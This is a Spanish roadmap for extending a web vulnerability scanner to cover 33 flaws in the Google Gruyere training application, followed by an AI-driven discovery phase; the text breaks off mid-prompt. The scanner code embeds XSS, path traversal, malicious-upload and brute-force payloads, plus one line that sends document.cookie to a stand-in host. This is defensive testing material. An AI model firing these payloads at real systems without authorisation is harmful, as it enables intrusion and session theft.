# Plan de Desarrollo — Detección de 33 Vulnerabilidades + IA Generativa
## Web Security Scanner — Roadmap Técnico

**Objetivo 1:** Cubrir las 33 vulnerabilidades documentadas en `vuldiplomado.md`
**Objetivo 2:** Usar el modelo fine-tuneado para descubrir y generar nuevos vectores de ataque
**Estado base:** `feat/ai-triage-mainline` branch

---

## 1. Análisis de Brechas — Estado Actual vs. Objetivo

| VUL | Clase | Módulo actual | ¿Detecta? | Acción |
|-----|-------|--------------|-----------|--------|
| 001 | XSS Reflejado `snippets.gtl?uid` | `xss_tester_async.py` | Parcial — solo params GET, no `uid` de path | Fix: probar todos los params incluyendo `uid` |
| 002 | XSS Reflejado `feed.gtl?uid` | `xss_tester_async.py` | Parcial | Fix: mismo que 001 |
| 003 | XSS Almacenado via snippet | — | **NO** | Nuevo: `stored_xss_tester_async.py` |
| 004 | XSS Almacenado via private_snippet | — | **NO** | Nuevo: `stored_xss_tester_async.py` |
| 005 | DOM XSS eval/innerHTML en lib.js | — | **NO** | Nuevo: `dom_xss_tester_async.py` |
| 006 | XSSI JSONP content-type incorrecto | — | **NO** | Nuevo: `xssi_tester_async.py` |
| 007 | IDOR feed.gtl expone datos privados | `idor_tester_async.py` | Parcial — solo params ID | Fix: detectar respuesta multi-usuario |
| 008 | CSRF formularios GET sin token | `csrf_tester_async.py` | **NO** — solo POST/PUT/DELETE | Fix: incluir GET forms con estado |
| 009 | Sin rate limiting / bloqueo cuenta | — | **NO** | Nuevo: `brute_force_detector_async.py` |
| 010 | Credenciales en URL (GET login) | — | **NO** | Nuevo: `credential_exposure_tester_async.py` |
| 011 | Cookie sin HttpOnly | `header_security_async.py` | Sí | — |
| 012 | Cookie sin Secure | `header_security_async.py` | Sí | — |
| 013 | Cookie sin SameSite | `csrf_tester_async.py` | Sí | — |
| 014 | Clickjacking sin X-Frame-Options | `header_security_async.py` | Sí | — |
| 015 | Info sensible en cookie (rol plaintext) | — | **NO** | Nuevo: `cookie_analyzer_async.py` |
| 016 | Sin CSP | `header_security_async.py` | Sí | — |
| 017 | Sin X-Content-Type-Options | `header_security_async.py` | Sí | — |
| 018 | Sin HSTS | `header_security_async.py` | Sí | — |
| 019 | Sin X-Frame-Options | `header_security_async.py` | Sí | — |
| 020 | X-XSS-Protection: 0 | `header_security_async.py` | Sí | — |
| 021 | Server disclosure | `header_security_async.py` | Sí | — |
| 022 | Tecnología EOL Python 2.7 | `technology_detector.py` | Parcial | Fix: mapear EOL versions |
| 023 | x-cloud-trace-context disclosure | `header_security_async.py` | Parcial | Fix: añadir infraestructura headers |
| 024 | Broken access control HTTP 200 sin auth | — | **NO** | Nuevo: `access_control_tester_async.py` |
| 025 | Stored XSS via upload HTML | — | **NO** | Nuevo: `file_upload_tester_async.py` |
| 026 | Path traversal en filename subido | — | **NO** | Nuevo: `file_upload_tester_async.py` |
| 027 | Path traversal URL encoded `%2F` | `path_traversal_async.py` | Parcial — solo params | Fix: URL-path traversal |
| 028 | XSS via data: URL en web_site | `xss_tester_async.py` | Parcial | Fix: detectar data:/javascript: en href |
| 029 | Upload JS servido como application/js | — | **NO** | Nuevo: `file_upload_tester_async.py` |
| 030 | Upload sin autenticación | — | **NO** | Nuevo: `access_control_tester_async.py` |
| 031 | feed.gtl sin autenticación | — | **NO** | Nuevo: `access_control_tester_async.py` |
| 032 | CSRF logout GET sin token | `csrf_tester_async.py` | **NO** | Fix: detectar logout sin token |
| 033 | file:// URL en campo icon | — | **NO** | Nuevo: `protocol_injection_tester_async.py` |

**Cobertura actual:** ~14/33 (42%)
**Objetivo tras el plan:** 33/33 (100%)

> **Estado (2026-09-12):** FASE 1 y FASE 2 implementadas y con tests (`tests/test_phase1_fixes.py`,
> `tests/test_phase2_new_modules.py`). Nota: DOM XSS (VUL-005) ya estaba cubierto por
> `BrowserRecon`/`DomXssFinding` en `modules/recon/browser_engine.py`, por lo que no se creó
> `dom_xss_tester_async.py` como módulo separado. Cobertura estimada tras estas fases: ~29/33 (88%).
>
> **FASE 3 — implementada con una desviación deliberada del diseño original:** el plan pedía un
> prompt de descubrimiento sin schema fijo (`raw_completion`, clases de vuln libres tipo
> "prototype pollution"/"business logic flaws"). Esto contradice el hardening ya invertido en
> `ai_module/structured_inference.py` / `prompt_guard.py` (decoding restringido a una taxonomía fija
> `VulnClass` = sqli/xss/pathtraver/cmdi, "lobotomía cognitiva" contra texto libre). Se decidió con
> el usuario (2026-09-12) constreñir el discovery a esa misma taxonomía en vez de reabrir una vía de
> salida no controlada. Implementado en:
> - `ai_module/structured_inference.py` — `HypothesisItem`/`DiscoveryOut` (pydantic), `parse_discovery`
> - `ai_module/prompts/discovery_system.md` — prompt restringido a sqli/xss/pathtraver/cmdi
> - `ai_module/agent_inference.py` — `AttackHypothesis`, `AgentClient.discover_attack_surface()`
> - `ai_module/vuln_discovery.py` — `iterative_discovery_loop()` desacoplado (callbacks, sin importar
>   `web_security_scanner`)
> - `web_security_scanner/modules/ai_discovery.py` — adaptador (mapeo VulnClass→Tester, construcción
>   de contexto, hypothesis→URL)
> - `web_security_scanner_async.py::_run_ai_discovery` + CLI `--enable-ai-discovery` /
>   `--ai-discovery-rounds` / `--ai-discovery-max-hypotheses` (requiere `--enable-ai-triaging`)
> No se implementó `js_analysis_system.md` / `analyze_js_for_dom_xss` (análisis JS en texto libre):
> misma razón, y DOM-XSS ya está cubierto por `browser_engine.py`. Tests: `tests/test_ai_discovery.py`.
>
> Pendiente: nada estructural; ver verificación en vivo abajo.

> **FASE 4 (2026-09-12):** dataset de discovery sintético (`ai_module/dataset_generator.py::
> build_discovery_samples`, 5 escenarios validados contra `DiscoveryOut`) + golden set de evaluación
> (`ai_module/evaluate_golden.py::DISCOVERY_GOLDEN_SET`/`score_discovery`/`evaluate_discovery_golden`).
> Confinados a la taxonomía fija (sqli/xss/pathtraver/cmdi), igual que Fase 3.
>
> **Verificación en vivo (2026-09-12) contra el objetivo autorizado de `vuldiplomado.md`**
> (`google-gruyere.appspot.com/386919.../`, uid=pepe): se corrió el scanner real (no solo unit
> tests) contra la instancia. Esto expuso y corrigió 5 bugs reales pre-existentes ajenos al plan:
> - `robots.txt` de Gruyere bloquea `/3*` → el crawler no rastreaba nada por defecto (usar `--no-robots`, ya existía).
> - `SessionManager` no soportaba login por GET (Gruyere usa `/login?uid=&pw=`) — enviaba el body
>   como `data=` en vez de `params=`. Fix en `session_async.py::_build_login_kwargs`.
> - `looks_logged_out()` marcaba como "sesión expirada" cualquier visita directa a la propia página
>   de login (falso positivo que generaba tormenta de reautenticación). Fix: solo dispara si la URL
>   final difiere de `login_url` (redirect-back real).
> - `CSRFTester` solo marcaba formularios GET "sensibles" (logout/delete); VUL-008
>   (`newsnippet2`/`saveprofile` GET sin token) no se detectaba. Fix: además de la lista de keywords,
>   se marca cualquier formulario GET con campos que no sean de solo-lectura (`READ_ONLY_FIELD_NAMES`).
> - `BruteForceDetector`/`CookieAnalyzer` usaban listas de nombres (`pass`/`pwd`, `session`/`sid`/...)
>   que no cubrían el campo `pw` ni la cookie `GRUYERE` reales de Gruyere. Fix: agregar `pw` exacto;
>   quitar el filtro por nombre de cookie (el regex de contenido ya es el filtro real).
> - `header_security_async.py` no listaba `X-Cloud-Trace-Context`/`Via` como headers de disclosure
>   (VUL-023, ya anotado como gap parcial en el análisis original).
>
> Tras los fixes, confirmado **en vivo contra el objetivo real** (no solo en tests unitarios):
> VUL-001, 008, 009, 010, 014, 015, 016-019, 021, 023, 024, 027, 028, 030, 032, 033 (18/33).
> Módulos para el resto están implementados y con tests unitarios, pero no se reconfirmaron en vivo
> esta sesión por: (a) `lib.js` construye la URL de `feed.gtl` por concatenación de strings
> (`"/" + uniqueId + "/feed.gtl"`), que el minero de endpoints JS (basado en regex, no AST) no puede
> reconstruir — afecta VUL-002/004/006/007/031 (mitigación: `--browser` con Playwright, que sí
> ejecuta el JS real, no probado esta sesión); (b) la respuesta de `/upload2` usa un mensaje de texto
> plano `"Upload Complete: <path>"` que el regex de confirmación de `file_upload_tester_async.py`
> (basado en `href`/`src`) no reconoce — afecta la confirmación de alcanzabilidad de VUL-025/026/029
> (la aceptación del upload sí se detectó); (c) VUL-005 (DOM XSS) depende de `browser_engine.py`
> (Playwright), no ejercitado esta sesión; VUL-022 (Python EOL) es de `technology_detector.py`, fuera
> del alcance tocado; VUL-011/012/013/020 son de módulos preexistentes no modificados en este trabajo
> (VUL-020 además es una decisión deliberada del proyecto: `X-XSS-Protection: 0` no se reporta como
> hallazgo porque los navegadores modernos lo ignoran — ver `test_x_xss_protection_zero_is_not_a_finding`).

---

## 2. Arquitectura — Módulos a Crear y Modificar

```
web_security_scanner/
└── modules/
    └── vulnerability_testers/
        ├── xss_tester_async.py          ← FIX
        ├── csrf_tester_async.py         ← FIX
        ├── path_traversal_async.py      ← FIX
        ├── idor_tester_async.py         ← FIX
        ├── header_security_async.py     ← FIX (añadir infra headers, EOL)
        │
        ├── stored_xss_tester_async.py   ← NUEVO
        ├── dom_xss_tester_async.py      ← NUEVO
        ├── xssi_tester_async.py         ← NUEVO
        ├── file_upload_tester_async.py  ← NUEVO
        ├── access_control_tester_async.py ← NUEVO
        ├── brute_force_detector_async.py  ← NUEVO
        ├── credential_exposure_tester_async.py ← NUEVO
        ├── cookie_analyzer_async.py     ← NUEVO
        └── protocol_injection_tester_async.py ← NUEVO

ai_module/
├── agent_inference.py         ← AMPLIAR: añadir discover_attack_surface()
├── prompts/
│   ├── triage_system.md       ← existente
│   ├── payload_system.md      ← existente
│   ├── discovery_system.md    ← NUEVO: prompt para descubrimiento de nuevas vulns
│   └── js_analysis_system.md  ← NUEVO: prompt para análisis de sinks JS
└── vuln_discovery.py          ← NUEVO: pipeline de descubrimiento autónomo
```

---

## 3. Fases de Desarrollo

---

### FASE 1 — Correcciones en Módulos Existentes (1-2 semanas)

#### 1.1 `xss_tester_async.py` — Añadir data: y javascript: href detection

**Problema:** No detecta XSS via `data:text/html,<script>` ni `javascript:` en atributos `href`/`src`.

**Cambios:**
```python
# Añadir a DEFAULT_PAYLOADS:
HREF_PAYLOADS = [
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
]

# En _assess(), añadir detección de href context:
HREF_DANGEROUS_PATTERNS = [
    re.compile(r"href=['\"]javascript:", re.I),
    re.compile(r"href=['\"]data:text/html", re.I),
    re.compile(r"src=['\"]javascript:", re.I),
]

@classmethod
def _assess_href(cls, payload: str, text: str) -> str | None:
    """Detect payload reflected inside href/src attribute without encoding."""
    if payload not in text:
        return None
    for pat in HREF_DANGEROUS_PATTERNS:
        if pat.search(text):
            return "HIGH"
    return None
```

---

#### 1.2 `csrf_tester_async.py` — Extender a GET forms y logout sin token

**Problema:** `STATE_CHANGING_METHODS = {'POST', 'PUT', 'DELETE', 'PATCH'}` excluye GET. Gruyere usa GET para todo (newsnippet2, saveprofile, logout).

**Cambios:**
```python
# Reemplazar lógica de filtrado de forms:
STATE_CHANGING_ACTIONS = [
    'newsnippet', 'save', 'update', 'delete', 'edit', 'create',
    'upload', 'logout', 'change', 'modify', 'remove', 'add',
]

def _is_state_changing_action(action_url: str) -> bool:
    """Return True if the form action URL suggests a state-changing operation."""
    action_lower = action_url.lower()
    return any(hint in action_lower for hint in STATE_CHANGING_ACTIONS)

# En run_test(), incluir GET forms con acciones de estado:
forms_to_check = []
for f in soup.find_all('form'):
    method = str(f.get('method') or 'GET').upper()
    action = f.get('action', '')
    if method in STATE_CHANGING_METHODS:
        forms_to_check.append(f)
    elif method == 'GET' and _is_state_changing_action(action):
        forms_to_check.append(f)  # GET forms con acción de estado

# Añadir detección de logout sin token:
async def _check_logout_csrf(self, base_url: str) -> None:
    """Check if /logout endpoint accepts GET without CSRF token."""
    from urllib.parse import urljoin
    logout_url = urljoin(base_url, 'logout')
    response = await self.scanner.request("GET", logout_url)
    if response and response.get('status') == 200:
        # Si responde 200 sin token, es CSRF en logout
        self._add_finding(
            url=logout_url,
            vuln_type="CSRF (Logout sin token)",
            severity="MEDIUM",
            evidence="GET /logout acepta petición sin CSRF token"
        )
```

---

#### 1.3 `path_traversal_async.py` — Añadir traversal en URL path (no solo params)

**Problema:** Solo prueba path traversal en parámetros GET/POST. No detecta `/{base}/..%2F..%2Fetc%2Fpasswd` en el path de la URL.

**Cambios:**
```python
# Añadir payloads URL-encoded para path segment traversal:
URL_PATH_PAYLOADS = [
    "/..%2F..%2Fetc%2Fpasswd",
    "/..%2F..%2F..%2Fetc%2Fpasswd",
    "/%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/..%2Fapp.yaml",
    "/..%2Fconfig.py",
]

async def _test_path_traversal_in_url(self, base_url: str) -> None:
    """Test path traversal by appending encoded ../ to the base URL path."""
    from urllib.parse import urlparse, urlunparse
    parsed = urlparse(base_url)
    base_path = parsed.path.rstrip('/')
    
    for payload in URL_PATH_PAYLOADS:
        test_url = urlunparse(parsed._replace(path=base_path + payload))
        response = await self.scanner.request("GET", test_url)
        if response and self._leaked_file(response.get('text', '')):
            self._add_finding(
                url=test_url,
                vuln_type="Path Traversal (URL path)",
                severity="CRITICAL",
                evidence=f"Payload {payload!r} reveló contenido de archivo del sistema"
            )
```

---

#### 1.4 `idor_tester_async.py` — Detectar exposición cross-user en endpoints feed

**Problema:** Solo prueba IDs alternativos en params. No detecta endpoints que devuelven datos de todos los usuarios.

**Cambios:**
```python
# Detectar respuestas que contienen múltiples UIDs distintos al usuario autenticado:
MULTI_USER_SIGNALS = [
    r'"uid"\s*:\s*"([^"]+)"',    # JSON con uid field
    r'"user"\s*:\s*"([^"]+)"',
    r'data-uid=["\']([^"\']+)["\']',
]

async def _check_multi_user_exposure(self, url: str, auth_uid: str) -> None:
    """Detect if endpoint returns data belonging to multiple users."""
    response = await self.scanner.request("GET", url)
    text = response.get('text', '') if response else ''
    exposed_users = set()
    for pattern in MULTI_USER_SIGNALS:
        exposed_users.update(re.findall(pattern, text))
    
    other_users = exposed_users - {auth_uid}
    if len(other_users) >= 2:
        self._add_finding(
            url=url, vuln_type="IDOR (Exposición multi-usuario)",
            severity="HIGH",
            evidence=f"Endpoint devuelve datos de {len(other_users)} usuarios distintos: {list(other_users)[:5]}"
        )
```

---

### FASE 2 — Nuevos Módulos de Detección (3-4 semanas)

---

#### 2.1 `stored_xss_tester_async.py` — XSS Almacenado

**Responsabilidades:**
- Inyectar payloads únicos (con token único por sesión) en todos los campos de formulario
- Rastrear las páginas de lectura asociadas a cada campo
- Detectar si el payload fue renderizado sin escapar en alguna página posterior

```python
class StoredXSSTester(VulnerabilityTester):
    """
    Estrategia en 3 pasos:
    1. INYECCIÓN: enviar payload único a todos los endpoints de escritura
       (campos de formulario, parámetros POST/GET)
    2. RASTREO: mapear qué páginas muestran el contenido ingresado
       (perfil, feed, home, listados)
    3. DETECCIÓN: buscar el token único en las páginas de lectura sin escapar
    """
    CANARY_PREFIX = "WSSstored"
    
    async def run_test(self, target_url: str, **kwargs):
        # Fase 1: Generar token único por campo
        canary = f"{self.CANARY_PREFIX}{int(time.time())}"
        payload = f'<img src=x id="{canary}" onerror=alert("{canary}")>'
        
        # Fase 2: Inyectar en todos los forms encontrados
        forms = kwargs.get('forms', [])
        for form in forms:
            await self._inject_and_track(form, payload, canary)
        
        # Fase 3: Rastrear páginas de lectura
        read_pages = await self._discover_read_pages(target_url)
        for page_url in read_pages:
            await self._check_for_canary(page_url, canary, payload)
    
    async def _check_for_canary(self, url: str, canary: str, payload: str):
        response = await self.scanner.request("GET", url)
        text = response.get('text', '') if response else ''
        # Token presente sin escapar = XSS almacenado
        if canary in text and payload in text:
            self._add_finding(url=url, vuln_type="XSS Almacenado",
                              severity="CRITICAL", evidence=payload)
```

---

#### 2.2 `dom_xss_tester_async.py` — DOM XSS via análisis estático de JS

**Responsabilidades:**
- Descargar y analizar archivos `.js` referenciados en las páginas
- Detectar sinks peligrosos: `eval()`, `innerHTML`, `document.write()`, `setTimeout(str)`, `location.href=`
- Identificar fuentes controlables: `location.search`, `location.hash`, `document.referrer`, `postMessage`
- Correlacionar fuentes con sinks y reportar cadenas de flujo

```python
DOM_XSS_SINKS = [
    (re.compile(r'\beval\s*\('), "eval()"),
    (re.compile(r'\.innerHTML\s*='), "innerHTML ="),
    (re.compile(r'\.outerHTML\s*='), "outerHTML ="),
    (re.compile(r'document\.write\s*\('), "document.write()"),
    (re.compile(r'document\.writeln\s*\('), "document.writeln()"),
    (re.compile(r'setTimeout\s*\(\s*["\']'), "setTimeout(string)"),
    (re.compile(r'setInterval\s*\(\s*["\']'), "setInterval(string)"),
    (re.compile(r'location\s*=\s*'), "location ="),
    (re.compile(r'location\.href\s*='), "location.href ="),
    (re.compile(r'location\.replace\s*\('), "location.replace()"),
    (re.compile(r'\.src\s*='), ".src ="),
    (re.compile(r'\.action\s*='), ".action ="),
]

DOM_XSS_SOURCES = [
    "location.search", "location.hash", "location.href",
    "document.referrer", "document.URL", "document.documentURI",
    "window.name", "postMessage",
]

class DOMXSSTester(VulnerabilityTester):
    async def run_test(self, target_url: str, **kwargs):
        # 1. Recopilar todos los scripts de la página
        scripts = await self._collect_scripts(target_url)
        
        for script_url, js_code in scripts:
            sinks_found = []
            for pattern, sink_name in DOM_XSS_SINKS:
                for match in pattern.finditer(js_code):
                    line_num = js_code[:match.start()].count('\n') + 1
                    context = js_code[max(0, match.start()-60):match.end()+60]
                    sinks_found.append((sink_name, line_num, context))
            
            # 2. Verificar si algún source alimenta un sink
            for source in DOM_XSS_SOURCES:
                if source in js_code:
                    for sink_name, line, ctx in sinks_found:
                        self._add_finding(
                            url=script_url,
                            vuln_type="DOM XSS",
                            severity="HIGH",
                            evidence=f"Source '{source}' → Sink '{sink_name}' (línea {line})\nContexto: {ctx}"
                        )
```

---

#### 2.3 `xssi_tester_async.py` — Cross-Site Script Inclusion

**Responsabilidades:**
- Detectar endpoints que devuelven JavaScript/JSONP con Content-Type: text/html
- Detectar callbacks JSONP con nombres controlables por el atacante
- Detectar APIs que incluyen datos de sesión en respuestas sin Access-Control-Allow-Origin

```python
JSONP_CALLBACK_PATTERNS = [
    re.compile(r'^[a-zA-Z_$][a-zA-Z0-9_$]*\s*\(\s*[\[\{]', re.MULTILINE),  # callback({...})
    re.compile(r'^[a-zA-Z_$][a-zA-Z0-9_$]*\s*\(\s*\(', re.MULTILINE),      # callback((...))
]

SENSITIVE_DATA_PATTERNS = [
    re.compile(r'"(?:email|username|uid|user_id|token|session|private)["\s]*:'),
    re.compile(r'"private_snippet"\s*:'),
]

class XSSITester(VulnerabilityTester):
    async def run_test(self, target_url: str, **kwargs):
        response = await self.scanner.request("GET", target_url)
        if not response:
            return
        
        content_type = response.get('headers', {}).get('content-type', '').lower()
        text = response.get('text', '')
        
        # Caso 1: Content-Type: text/html pero respuesta es JavaScript
        is_jsonp = any(p.search(text[:200]) for p in JSONP_CALLBACK_PATTERNS)
        is_html_ct = 'text/html' in content_type
        
        if is_jsonp and is_html_ct:
            has_sensitive = any(p.search(text) for p in SENSITIVE_DATA_PATTERNS)
            severity = "HIGH" if has_sensitive else "MEDIUM"
            self._add_finding(
                url=target_url,
                vuln_type="XSSI (Cross-Site Script Inclusion)",
                severity=severity,
                evidence=f"JSONP con Content-Type: text/html. Datos sensibles: {has_sensitive}"
            )
        
        # Caso 2: Parámetro callback controlable
        for param in ['callback', 'cb', 'jsonp', 'fn', 'func']:
            test_url = f"{target_url}{'&' if '?' in target_url else '?'}{param}=WSSxssi_probe"
            r2 = await self.scanner.request("GET", test_url)
            if r2 and 'WSSxssi_probe(' in r2.get('text', ''):
                self._add_finding(
                    url=test_url,
                    vuln_type="JSONP Callback Controlable",
                    severity="HIGH",
                    evidence=f"Parámetro '{param}' controla el callback JSONP"
                )
```

---

#### 2.4 `file_upload_tester_async.py` — Carga Arbitraria de Archivos

**Responsabilidades:**
- Detectar endpoints de upload (multipart/form-data)
- Probar carga de HTML/JS/SVG y verificar Content-Type en la respuesta
- Probar path traversal en el nombre del archivo (`../victim/payload.html`)
- Verificar acceso sin autenticación al endpoint de upload

```python
DANGEROUS_TYPES = [
    ("xss_test.html", b"<script>alert('wss-upload-xss')</script>", "text/html"),
    ("xss_test.svg",  b'<svg onload="alert(1)"/>', "image/svg+xml"),
    ("xss_test.js",   b"alert('wss-js-upload')", "application/javascript"),
    ("xss_test.php",  b"<?php phpinfo(); ?>", "application/x-php"),
]

class FileUploadTester(VulnerabilityTester):
    async def run_test(self, target_url: str, **kwargs):
        upload_endpoints = await self._discover_upload_forms(target_url)
        
        for endpoint, field_name in upload_endpoints:
            # Test 1: Tipos de archivo peligrosos
            for filename, content, mime in DANGEROUS_TYPES:
                upload_url = await self._upload_file(endpoint, field_name, filename, content, mime)
                if upload_url:
                    served_ct = await self._get_content_type(upload_url)
                    if any(t in (served_ct or '') for t in ['text/html', 'application/javascript', 'image/svg']):
                        self._add_finding(
                            url=upload_url,
                            vuln_type=f"Carga de archivo peligroso ({filename})",
                            severity="CRITICAL",
                            evidence=f"Archivo {filename!r} servido como {served_ct!r}"
                        )
            
            # Test 2: Path traversal en filename
            traversal_name = "../victim_user/wss_traversal.html"
            upload_url_t = await self._upload_file(
                endpoint, field_name, traversal_name,
                b"<script>alert('traversal')</script>", "text/html"
            )
            if upload_url_t and 'victim_user' in upload_url_t:
                self._add_finding(
                    url=upload_url_t,
                    vuln_type="Path Traversal en Upload (filename)",
                    severity="CRITICAL",
                    evidence=f"Filename '../' no sanitizado — archivo en directorio de otro usuario"
                )
            
            # Test 3: Upload sin autenticación
            upload_noauth = await self._upload_without_auth(endpoint, field_name)
            if upload_noauth:
                self._add_finding(
                    url=endpoint,
                    vuln_type="Upload sin Autenticación",
                    severity="HIGH",
                    evidence="Endpoint acepta uploads sin cookie de sesión"
                )
    
    async def _upload_without_auth(self, endpoint: str, field_name: str) -> str | None:
        """Retry upload without session cookie."""
        # Petición sin cookie para verificar control de acceso
        ...
```

---

#### 2.5 `access_control_tester_async.py` — Control de Acceso Roto

**Responsabilidades:**
- Acceder a endpoints protegidos sin autenticación y verificar que retornen 401/403/302
- Detectar endpoints de datos que retornan HTTP 200 sin credenciales
- Detectar endpoints de escritura accesibles sin autenticación

```python
# Patrones de URL que deben estar protegidos
PROTECTED_PATTERNS = [
    re.compile(r'/(profile|account|settings|dashboard|admin|user|myaccount)', re.I),
    re.compile(r'/(edit|delete|update|save|create|add|new)', re.I),
    re.compile(r'/(feed|data|api).*\.(gtl|json|xml)', re.I),
]

UNPROTECTED_INDICATORS = [
    re.compile(r'"(?:email|username|uid|private|token|password)["\s]*:'),
    re.compile(r'private_snippet'),
]

class AccessControlTester(VulnerabilityTester):
    async def run_test(self, target_url: str, **kwargs):
        crawled_urls = kwargs.get('crawled_urls', [target_url])
        
        for url in crawled_urls:
            if not any(p.search(url) for p in PROTECTED_PATTERNS):
                continue
            
            # Petición sin autenticación
            response_noauth = await self.scanner.request(
                "GET", url, skip_auth=True
            )
            if not response_noauth:
                continue
            
            status = response_noauth.get('status', 0)
            text = response_noauth.get('text', '')
            
            # Debe redirigir al login o retornar 401/403
            if status == 200:
                has_sensitive = any(p.search(text) for p in UNPROTECTED_INDICATORS)
                if has_sensitive:
                    self._add_finding(
                        url=url,
                        vuln_type="Broken Access Control (datos expuestos sin auth)",
                        severity="HIGH",
                        evidence=f"HTTP 200 sin autenticación con datos sensibles"
                    )
                else:
                    self._add_finding(
                        url=url,
                        vuln_type="Broken Access Control (HTTP 200 sin auth)",
                        severity="MEDIUM",
                        evidence=f"Endpoint protegido retorna HTTP 200 sin credenciales"
                    )
```

---

#### 2.6 `brute_force_detector_async.py` — Detección de Sin Rate Limiting

**Responsabilidades:**
- Enviar N peticiones de login con credenciales inválidas
- Verificar si alguna retorna HTTP 429, bloqueo de cuenta o CAPTCHA
- Medir si el tiempo de respuesta aumenta progresivamente (backoff)

```python
class BruteForceDetector(VulnerabilityTester):
    ATTEMPTS = 10
    
    async def run_test(self, target_url: str, **kwargs):
        login_urls = await self._find_login_endpoints(target_url)
        
        for login_url, uid_field, pw_field in login_urls:
            blocked = False
            times = []
            
            for i in range(self.ATTEMPTS):
                t0 = time.time()
                response = await self.scanner.request(
                    "GET" if "?" in login_url else "POST",
                    login_url,
                    params={uid_field: "testuser_wss", pw_field: f"wrongpass{i}"}
                )
                elapsed = time.time() - t0
                times.append(elapsed)
                
                status = response.get('status', 0) if response else 0
                text = response.get('text', '') if response else ''
                
                if status == 429 or 'locked' in text.lower() or 'captcha' in text.lower():
                    blocked = True
                    break
            
            if not blocked:
                avg_time = sum(times) / len(times)
                time_increasing = times[-1] > times[0] * 2  # backoff detection
                
                self._add_finding(
                    url=login_url,
                    vuln_type="Sin Rate Limiting / Sin Bloqueo de Cuenta",
                    severity="HIGH",
                    evidence=f"{self.ATTEMPTS} intentos sin bloqueo, sin 429, sin CAPTCHA. "
                             f"Backoff detectado: {time_increasing}"
                )
```

---

#### 2.7 `credential_exposure_tester_async.py` — Credenciales en URL

**Responsabilidades:**
- Detectar formularios de login que usan GET
- Verificar que credenciales no aparezcan en URLs del historial de navegación simulado

```python
PASSWORD_FIELD_HINTS = ['password', 'pw', 'pass', 'passwd', 'contraseña', 'clave', 'secret']

class CredentialExposureTester(VulnerabilityTester):
    async def run_test(self, target_url: str, **kwargs):
        response = await self.scanner.request("GET", target_url)
        if not response:
            return
        
        soup = BeautifulSoup(response.get('text', ''), 'html.parser')
        
        for form in soup.find_all('form'):
            method = str(form.get('method') or 'GET').upper()
            if method != 'GET':
                continue
            
            pw_fields = [
                inp for inp in form.find_all('input')
                if any(h in (inp.get('name') or inp.get('type') or '').lower()
                       for h in PASSWORD_FIELD_HINTS)
            ]
            
            if pw_fields:
                field_names = [f.get('name', '?') for f in pw_fields]
                self._add_finding(
                    url=target_url,
                    vuln_type="Credenciales en URL (formulario GET)",
                    severity="HIGH",
                    evidence=f"Formulario login usa método GET. Campos de contraseña: {field_names}. "
                             f"Las credenciales aparecerán en URL, logs y Referer."
                )
```

---

#### 2.8 `cookie_analyzer_async.py` — Análisis de Contenido de Cookies

**Responsabilidades:**
- Verificar ausencia de HttpOnly, Secure, SameSite (ya cubierto en header_security, aquí se añade análisis de CONTENIDO)
- Detectar si el valor de la cookie contiene datos sensibles en texto plano (uid, rol, email)
- Detectar cookies con estructura decodificable que exponga información

```python
SENSITIVE_IN_COOKIE = [
    (re.compile(r'\|[a-z0-9_]+\|'), "uid en texto plano"),
    (re.compile(r'\|(admin|author|user|root|staff)\b', re.I), "rol en texto plano"),
    (re.compile(r'[a-f0-9]{8}\|'), "hash corto (posiblemente CRC32/MD5 truncado)"),
]

class CookieAnalyzer(VulnerabilityTester):
    async def run_test(self, target_url: str, **kwargs):
        response = await self.scanner.request("GET", target_url)
        cookies = response.get('cookies', {}) if response else {}
        
        for name, value in cookies.items():
            for pattern, description in SENSITIVE_IN_COOKIE:
                if pattern.search(value):
                    self._add_finding(
                        url=target_url,
                        vuln_type="Información sensible en cookie",
                        severity="MEDIUM",
                        evidence=f"Cookie '{name}' contiene {description}: valor={value!r}"
                    )
```

---

#### 2.9 `protocol_injection_tester_async.py` — Inyección de Protocolos Peligrosos

**Responsabilidades:**
- Probar campos de texto (web_site, icon, url, link) con payloads `javascript:`, `data:`, `file://`, `vbscript:`
- Verificar si el valor se renderiza en href/src sin escapar el protocolo

```python
DANGEROUS_PROTOCOLS = [
    "javascript:alert(1)",
    "javascript:void(fetch('https://wss-probe.example.com/?c='+document.cookie))",
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "file:///etc/passwd",
    "vbscript:msgbox(1)",
]

HREF_SRC_PATTERN = re.compile(
    r'(?:href|src|action|data|formaction)\s*=\s*["\']([^"\']*)["\']', re.I
)

class ProtocolInjectionTester(VulnerabilityTester):
    async def run_test(self, target_url: str, **kwargs):
        forms = kwargs.get('forms', [])
        
        for form in forms:
            for inp in form.find_all('input', {'type': ['text', 'url', None]}):
                field_name = inp.get('name', '')
                if not field_name:
                    continue
                
                for proto_payload in DANGEROUS_PROTOCOLS:
                    # Inyectar en el campo y leer las páginas que lo renderizan
                    await self._inject_and_check_reflection(
                        target_url, form, field_name, proto_payload
                    )
    
    async def _inject_and_check_reflection(self, base_url, form, field, payload):
        # 1. Enviar el payload
        action = form.get('action', base_url)
        await self.scanner.request("GET", f"{action}?{field}={quote(payload)}")
        
        # 2. Buscar el valor en páginas de lectura
        read_pages = await self._find_render_pages(base_url, field)
        for page_url in read_pages:
            response = await self.scanner.request("GET", page_url)
            text = response.get('text', '') if response else ''
            
            # Verificar si el protocolo peligroso está en un href/src sin escapar
            for m in HREF_SRC_PATTERN.finditer(text):
                attr_val = m.group(1)
                if any(proto in attr_val for proto in ['javascript:', 'data:', 'file://', 'vbscript:']):
                    self._add_finding(
                        url=page_url,
                        vuln_type="Inyección de protocolo peligroso en href/src",
                        severity="HIGH",
                        evidence=f"Campo '{field}' con payload '{payload[:50]}' renderizado en atributo: {m.group(0)[:100]}"
                    )
```

---

### FASE 3 — Integración del Modelo Fine-tuneado para Descubrimiento Autónomo (2-3 semanas)

La FASE 3 convierte al modelo de un verificador reactivo (triage/payloads) en un agente proactivo que:
1. Analiza la superficie de ataque descubierta
2. Propone hipótesis de vulnerabilidades no exploradas
3. Genera cadenas de ataque multi-paso
4. Aprende de los resultados para refinar las hipótesis

---

#### 3.1 Nuevo prompt — `discovery_system.md`

```markdown
---
name: discovery_system
role: system
purpose: Proactive vulnerability discovery from application context
---

Eres un investigador de seguridad ofensiva especializado en análisis de
